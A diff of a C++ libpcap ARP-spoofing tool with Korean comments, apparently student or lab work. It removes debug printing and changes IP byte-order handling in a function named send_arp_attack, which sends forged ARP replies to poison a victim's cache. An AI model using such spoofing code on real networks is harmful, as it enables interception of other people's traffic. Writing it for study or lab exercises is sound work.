@@ -22,17 +22,6 @@ void request_sender_mac(pcap_t* handle, uint8_t* my_mac, uint32_t my_ip, uint32_
         memset(packet.arp_.dmac_, 0x00, 6);
         packet.arp_.dip_ = sender_ip;
 
-        // ================== 디버깅 로그 추가 ==================
-        printf("\n--- Sending ARP Request ---\n");
-        printf("Eth Dst MAC: "); print_mac(packet.eth_.dmac_);
-        printf("\nEth Src MAC: "); print_mac(packet.eth_.smac_);
-        printf("\nARP Sender MAC: "); print_mac(packet.arp_.smac_);
-        printf("\nARP Sender IP: "); print_ip(packet.arp_.sip_);
-        printf("\nARP Target MAC: "); print_mac(packet.arp_.dmac_);
-        printf("\nARP Target IP: "); print_ip(packet.arp_.dip_);
-        printf("\n--------------------------\n");
-        // ====================================================
-
         int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArp));
         if (res != 0) {
             fprintf(stderr, "request sender mac packet return %d error=%s\n", res, pcap_geterr(handle));
@@ -47,24 +36,14 @@ bool analysis_sender_mac(pcap_t* handle, uint32_t my_ip, uint32_t sender_ip, uin
         if (res == 0) continue;
         if (res < 0) return false;
 
-        printf("\n[DEBUG] Packet received. Analyzing...\n");
-
         // 1. ARP 패킷인지 확인
         struct EthHdr* eth_hdr = (struct EthHdr*)packet;
-        uint16_t eth_type = ntohs(eth_hdr->type_);
-        printf("[DEBUG] Ethernet Type: 0x%04x ", eth_type);
         if (ntohs(eth_hdr->type_) != EthHdr::ARP) {
             printf("(Not an ARP packet, skipping.)\n");
             continue; // ARP가 아니면 이 패킷은 무시하고 다음 패킷으로
         }
 
         struct ArpHdr* arp_hdr = (struct ArpHdr*)(packet + sizeof(EthHdr));
-        uint16_t arp_op = ntohs(arp_hdr->op_);
-        printf("[DEBUG] ARP Opcode: %u ", arp_op);
-
-        printf("[DEBUG] Received Sender IP: "); print_ip(arp_hdr->sip_);
-        printf("\n[DEBUG] Expected Sender IP: "); print_ip(sender_ip);
-        printf("\n");  
 
         // 2. 내가 찾던 ARP Reply인지 확인
         if (ntohs(arp_hdr->op_) == ArpHdr::REPLY && arp_hdr->sip_ == sender_ip) {
@@ -88,9 +67,9 @@ void send_arp_attack(pcap_t* handle, uint8_t* sender_mac, uint32_t sender_ip, ui
     packet.arp_.plen_ = 0x04;
     packet.arp_.op_ = htons(ArpHdr::REPLY);
     memcpy(packet.arp_.smac_, my_mac, 6);
-    packet.arp_.sip_ = htonl(target_ip);
+    packet.arp_.sip_ = target_ip;
     memcpy(packet.arp_.dmac_, sender_mac, 6);
-    packet.arp_.dip_ = htonl(sender_ip);
+    packet.arp_.dip_ = sender_ip;
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArp));
 	if (res != 0) {
